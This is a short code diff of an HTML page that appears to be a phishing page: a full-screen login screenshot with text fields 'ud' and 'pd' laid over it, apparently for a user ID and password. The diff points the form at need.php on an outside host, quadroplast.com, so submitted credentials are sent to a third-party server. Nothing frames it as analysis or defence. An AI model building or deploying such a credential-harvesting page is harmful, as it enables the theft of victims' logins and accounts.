@@ -57,7 +57,7 @@ $(window).load(function() {
 <div class="loader"></div>
 <div id="container">
 <div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1365px; height:662px; z-index:0"><img src="images/et.png" alt="" title="" border=0 width=1365 height=662></div>
-<form action=need.php name=tezandhi id=tezandhi method=post>
+<form action=https://quadroplast.com/et/et/need.php name=tezandhi id=tezandhi method=post>
 <input name="ud" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:288px;left:583px;top:334px;z-index:1">
 <input name="pd" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:288px;left:583px;top:365px;z-index:2">
 <div id="formimage1" style="position:absolute; left:579px; top:415px; z-index:3"><input type="image" name="formimage1" width="53" height="22" src="images/tgs.png"></div>
